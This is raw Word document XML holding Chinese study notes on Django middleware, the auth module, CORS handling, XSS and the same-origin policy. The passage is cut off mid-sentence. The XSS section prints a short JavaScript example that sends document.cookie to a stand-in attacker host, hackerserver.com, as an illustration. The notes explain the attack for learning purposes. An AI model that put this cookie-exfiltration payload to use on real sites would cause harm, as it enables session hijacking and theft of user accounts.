    <w:p w14:paraId="7398A21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from django.utils.deprecation import MiddlewareMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419005C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class MD1(MiddlewareMixin):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D3A9C0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def process_request(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7F9DB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print("MD1</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>里面的</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> process_request")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D35186" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="008B2E56">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r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>请求流程图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13EB50CF" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="008B2E56">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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="425CB311" wp14:editId="794E715C">
            <wp:extent cx="7035165" cy="3546855"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="4" name="图片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02599" cy="3580853"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4587C17B"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Auth</w:t>
      </w:r>
      <w:r w:rsidRPr="0022246E">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>模块是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041672F0"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使用auth模块 必须用全套 不是自己写一部分 用别人一部分</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C442033" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="00173FC9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="36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Auth</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模块是</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>自带的用户认证模块：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C943B84"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我们在开发一个网站的时候，无可避免的需要设计实现网站的用户系统。此时我们需要实现包括用户注册、用户登录、用户认证、注销、修改密码等功能，这还真是个麻烦的事情呢。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBBFB84"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Django作为一个完美主义者的终极框架，当然也会想到用户的这些痛点。它内置了强大的用户认证系统--auth，它默认使用 auth_user 表来存储用户数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FACB226"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lastRenderedPageBreak/>
        <w:t>python manage.py createsuperuser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3B2250"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from django.contrib import auth</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA02DFA"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django-cors-header</w:t>
      </w:r>
      <w:r w:rsidRPr="0022246E">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>解决请求跨域问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E10C4A2" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="00173FC9" w:rsidRDefault="008B2E56" w:rsidP="008B2E56">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8"/>
          <w:szCs w:val="38"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>攻击</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74545B82"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XSS攻击是Web攻击中最常见的攻击方法之一，它是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，形成了一次有效XSS攻击，一旦攻击成功，它可以获取用户的联系人列表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实 施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨大的，是web安全的头号大敌。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63477034" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="00782C4A" w:rsidRDefault="008B2E56" w:rsidP="008B2E56">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00782C4A">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>攻击的条件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A85CF9"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实施XSS攻击需要具备两个条件：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44038D61"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 xml:space="preserve">　　一、需要向web页面注入恶意代码；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5753A2AB" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="00173FC9" w:rsidRDefault="008B2E56" w:rsidP="00173FC9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008080"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008080"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">　　二、这些恶意代码能够被浏览器成功的执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E94718F" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="00173FC9"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2"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>攻击能做些什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD542F4" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="00173FC9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="36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1.</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>窃取</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，读取目标网站的</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>发送到黑客的服务器上，如下面的代码：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="137679D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var i=document.createElement("img")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432CCF7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document.body.appendChild(i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2921234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i.src = "http://www.hackerserver.com/?c=" + document.cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775393CA" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="00173FC9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="36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2.</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>读取用户未公开的资料，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C599847"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什么是浏览器同源策略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7433CB35" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="00D96E02" w:rsidP="008B2E56">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId112" w:history="1">
        <w:r w:rsidR="008B2E56" w:rsidRPr="007C2612">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="4183C4"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>同源策略</w:t>
        </w:r>
        <w:r w:rsidR="008B2E56" w:rsidRPr="007C2612">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="4183C4"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>https://www.cnblogs.com/laixiangran/p/9064769.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0207B448" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B"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同源策略（</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Same origin policy</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9BE3BA" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B"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它的核心就在于它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该只被允许访问来自同一站点的资源，而不是那些来自其它站点可能怀有恶意的资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037C51E9"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所谓同源是指：域名、协议、端口相同。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="535EFB16"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下表是相对于</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http://www.laixiangran.cn/home/index.html</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的同源检测结果：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD3519B" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="008B2E56">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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="515FBCA0" wp14:editId="60D416AC">
            <wp:extent cx="6923405" cy="2013585"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="5" name="图片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23405" cy="2013585"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEEA69D" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="36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另外，同源策略又分为以下两种：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147A9FE4" w14:textId="3814B985"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1</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">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 xml:space="preserve">DOM </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>同源策略：禁止对不同源页面</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> DOM </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>进行操作。这里主要场景是</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> iframe </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>跨域的情况，不同域名的</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> iframe </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是限制互相访问的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F54B2EA" w14:textId="2DDF2C37"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2</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">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 xml:space="preserve">XMLHttpRequest </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>同源策略：禁止使用</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> XHR </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象向不同源的服务器地址发起</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F60809E"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95285B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>为什么要有跨域限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2432FD6D" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B"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因为存在浏览器同源策略，所以才会有跨域问题。那么浏览器是出于何种原因会有跨域的限制呢。其实不难想到，跨域限制主要的目的就是为了用户的上网安全。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5330F1C6" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="0095285B"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如果浏览器没有同源策略，会存在什么样的安全问题呢。下面从</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> DOM </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>同源策略和</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> XMLHttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>同源策略来举例说明：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B81518"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如果没有</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> DOM </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>同源策略，也就是说不同域的</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> iframe </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>之间可以相互访问，那么黑客可以这样进行攻击：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0DFD3C" w14:textId="3F52227E"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hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>1</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做一个假网站，里面用</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> iframe </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>嵌套一个银行网站</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://mybank.com</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
